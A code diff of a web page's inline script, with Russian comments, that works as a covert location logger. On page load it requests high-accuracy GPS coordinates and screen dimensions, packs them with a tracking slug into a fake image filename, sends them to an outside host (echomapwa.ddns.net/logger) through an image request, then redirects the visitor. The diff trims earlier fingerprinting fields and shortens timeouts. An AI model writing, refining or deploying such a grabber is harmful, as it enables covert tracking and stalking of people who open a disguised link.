@@ -14,7 +14,8 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const slug = urlParams.get('id');
-        // Твой сервер
+        
+        // ТВОИ НАСТРОЙКИ
         const targetServer = "http://echomapwa.ddns.net/logger/get_img/";
         const finalRedirect = "http://echomapwa.ddns.net/logger/l/";
 
@@ -23,49 +24,39 @@
             
             let info = {
                 sw: window.screen.width, sh: window.screen.height,
-                plt: navigator.platform, cores: navigator.hardwareConcurrency || 0,
-                lang: navigator.language, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 lat: "null", lon: "null"
             };
 
-            // 1. Попытка получить GPS
+            // 1. Сбор GPS (с таймаутом, чтобы не висеть вечно)
             if (navigator.geolocation) {
                 try {
-                    const pos = await new Promise((resolve, reject) => {
-                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    const pos = await new Promise((res, rej) => {
+                        navigator.geolocation.getCurrentPosition(res, rej, {
                             enableHighAccuracy: true,
-                            timeout: 10000, 
+                            timeout: 5000, 
                             maximumAge: 0
                         });
                     });
                     info.lat = pos.coords.latitude;
                     info.lon = pos.coords.longitude;
-                } catch (e) {
-                    console.log("GPS fail: " + e.message);
-                }
+                } catch (e) { console.log("GPS Skip"); }
             }
 
-            // 2. Формируем "хитрое" имя картинки с данными
-            // Формат: lat_ЗНАЧЕНИЕ_lon_ЗНАЧЕНИЕ_sw_ШИРИНА_sh_ВЫСОТА_id_СЛАГ.png
+            // 2. Формируем имя файла
             const fileName = `lat_${info.lat}_lon_${info.lon}_sw_${info.sw}_sh_${info.sh}_id_${slug}.png`;
             
-            // 3. Отправка через создание элемента Image
+            // 3. Отправка и редирект
             const img = new Image();
-            
-            const go = () => { 
-                // Добавляем ?ready=1, чтобы сервер знал: данные собраны!
-                setTimeout(() => {
-                    window.location.href = finalRedirect + slug + "?ready=1";
-                }, 500);
+            const go = () => {
+                // Добавляем ?ready=1, чтобы остановить петлю на сервере
+                window.location.href = `${finalRedirect}${slug}?ready=1`;
             };
 
-            img.onload = img.onerror = go;
-
-            // Пуск!
+            img.onload = img.onerror = go; 
             img.src = `${targetServer}${fileName}?t=${Date.now()}`;
             
-            // Запасной тайм-аут редиректа (если картинка не грузится)
-            setTimeout(go, 5000);
+            // Страховка (4 секунды)
+            setTimeout(go, 4000);
         }
 
         collectAndGo();
